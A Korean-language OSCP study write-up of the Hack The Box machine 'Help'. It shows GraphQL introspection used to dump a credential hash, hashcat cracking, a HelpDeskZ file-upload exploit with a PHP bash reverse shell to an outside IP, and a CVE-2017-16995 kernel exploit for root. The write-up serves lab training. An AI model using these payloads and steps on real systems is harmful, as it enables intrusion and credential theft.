---
slug: "help"
title: "_help"
date: 2026-07-01
category: "linux"
section: "OSCP"
group: "01_boxes"
tags: []
excerpt: "**graphQL 같은 경우엔 REST API와 약간 다른게 쿼리를 통해 필요한 데이터만 쏙쏙 가져올 수 있다고 함** restapi는 뭐 엔드포인트가 여러개 생기고…"
readingTime: 9
---

#### Box: help | Linux | Easy
날짜:
소요시간:

##### Open Ports
22 : ssh
80 : http
3000 : node.js
##### Interesting Services
3000 포트에 다음과 같은 내용이 있음
```json
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```
쿼리를 던진다는건 보통 graphql에서 많이 사용하는 말임

**graphQL 같은 경우엔 REST API와 약간 다른게 쿼리를 통해 필요한 데이터만 쏙쏙 가져올 수 있다고 함**
restapi는 뭐 엔드포인트가 여러개 생기고 graphql은 엔드포인트 하나에 request만 다르게 해서 보내는 개념
```
REST API
→ example.com/class
→ example.com/class/{반 index}
→ example.com/class/{반 index}/students
→ example.com/class/{반 index}/students/{학생 index}

GraphQL
→ example.com/graphql
(하나의 엔드포인트에 다른 쿼리를 사용해 요청)
```
-> grapql은 필요한거만 쏙쏙 빼서 쓸 수 있다는 장점이 있음

`x-powerd-By: Express` 는 해당 서버가 `node.js/express`로 구동 된다는 걸 외부에 노출함

-> 그럼 이걸로 graphql을 사용한다는걸 암시함 -> 바로 체크 ㄱㄱ
```
http://10.129.230.159:3000/graphql
->  GET query missing.

http://10.129.230.159:3000/kimbell
->  Cannot GET /kimbell
```
둘의 반응이 다르다는 것을 알 수 있음 curl로 스키마 보는 쿼리 한번 짜보면
```shell
curl -X POST "http://10.129.230.159:3000/graphql" -H "Content-Type: application/json" \
-d '{ "query": "{__typename}" }'
```
-> GraphQL 엔드포인트가 살아있는지, 정상적으로 쿼리를 처리하는지 확인하는 용도로 흔히 씀. 응답이 정상적으로 오면(예: `{"data":{"__typename":"Query"}}`) 그 엔드포인트가 진짜 GraphQL이라는 게 확인

**1단계 - 전체 타입 목록 보기**
```
{ __schema { types { name } } }
```
→ 어떤 타입들이 존재하는지 (Query, User, String 등)

**2단계 - 입구(Query) 찾기**
```
{ __type(name: "Query") { fields { name args { name type { name } } type { name } } } }
```
→ "Query" 타입에서 호출 가능한 진입점들. 여기서 `user`라는 필드가 인자 없이 `User`를 반환한다는 걸 알아냄.

→ `arg`가 있었다면 -> =`args`에 `{"name": "id", "type": {"name": "ID"}}` 같은 게 있었다면, `user` 필드가 `id`라는 인자를 받는다는 뜻. 그럼 호출할 때 이렇게 인자를 같이 넘겨줘야 함
```
{ user(id: "1") { username password } }
```

**3단계 - 반환 타입(User)의 속성 보기**
```
{ __type(name: "User") { fields { name type { name } } } }
```
→ `User` 타입 안에 `username`, `password` 필드가 있다는 걸 확인.

여기까지가 전부 "메타 쿼리"(스키마 구조 파악용)고, `__type`, `__schema`, `fields`, `args`는 다 GraphQL 표준에 내장된 introspection 전용 키워드라서 어떤 GraphQL 서버에도 거의 그대로 쓸 수 있어. 

패턴은 항상 타입 이름 알아내기 → 그 타입의 필드 알아내기 → 필드의 반환 타입 알아내기

**4단계 - 진짜 데이터 가져오기**
```
{ user { username password } }
```
→ 이제 메타 쿼리가 아니라 실제 쿼리. 2,3단계에서 알아낸 필드 이름(`username`, `password`)을 그대로 적어서 실제 값을 요청. 결과로 이메일이랑 MD5 해시 하나 나옴.
`{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}`

-> pw가 32글자 hash로 보여서 md5로 지정하고 hashcat 사용
```shell
hashcat -m 0 -a 0 "5d3c93182bb20f07b994a7f617e99cff" /usr/share/wordlists/rockyou.txt
# godhelpmeplz
```

~~~shell
gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
~~~
-> /support 사이트가 열려 있음, 위에 크레덴셜로 로그인이 가능

```shell
searchsploit helpdeskz

HelpDeskZ 1.0.2 - Arbitrary File Upload   ->   php/webapps/40300.py

HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download   
                                          ->  php/webapps/41200.py

Helpdeskz v2.0.2 - Stored XSS    ->     php/webapps/52068.txt
```


**RCE 취약점**
열린 페이지를 보면 `helpdeskz`인데 여기에 RCE 취약점이 있다고 함

`submit a ticket`페이지에 접속후 리버스쉘 코드를 넣음
-> 파일형식이 맞지 않아 받을 수 없다고 하지만 내부적으로 파일을 미리 저장은 해놓고 형식이 맞지 않다고 말만 하는 취약점임

리버스쉘 작성 후 해당 php 파일을 업로드
```php
<?php exec("bash -c 'bash -i >& /dev/tcp/10.10.15.242/5555 0>&1'"); ?>
```

https://github.com/JubJubMcGrub/HelpDeskZ-1.0.2-File-Uplaod/blob/master/helpdeskz.py#L9
간단한 설명 : `md5(원본파일명 + 업로드시각)` 형식으로 난수화돼서, URL을 그냥 알 방법이 없음

위에 익스플로잇 코드를 최신식으로 수정 후 실행해보면
~~~shell
./exploit.py http://help.htb/support/uploads/tickets/ exploit.php

HelpDesk v1.0.2 - Unauthenticated shell upload
found!
http://help.htb/support/uploads/tickets/efa929ce35c0d0251bc776f94cb7c512.php
~~~
다음과 같은 md5형식으로 이뤄진듯한 url이 생성되고 쉘에 접속해보면 
user.txt: b4adefc48c1693cb1969ace6bdec5528

##### Initial Foothold
벡터:
명령어:

##### Privilege Escalation
벡터:
명령어:

치트시트에 하나 늘었음
~~~shell
uname -a 

# Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
~~~
해당 리눅스 커널에 취약점이 있다고 함  **[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)**

위에 익스플로잇 칼리에서 작성후 박스에 보냄
```shell
#kali
python3 -m http.server 8000

#user
#우선 c기반 코드기에 gcc가 있는지 확인
which gcc 
wget http://{ip}:{port}/CVE-2017-16995.c CVE-2017-16995.c

gcc -o CVE-2017-16995 CVE-2017-16995.c

./CVE-2017-16995
#root.txt: 16c063222487e5ecf1d9a0c5b6067f7c
```
##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
 - graphql curl 쿼리
 - uname -a
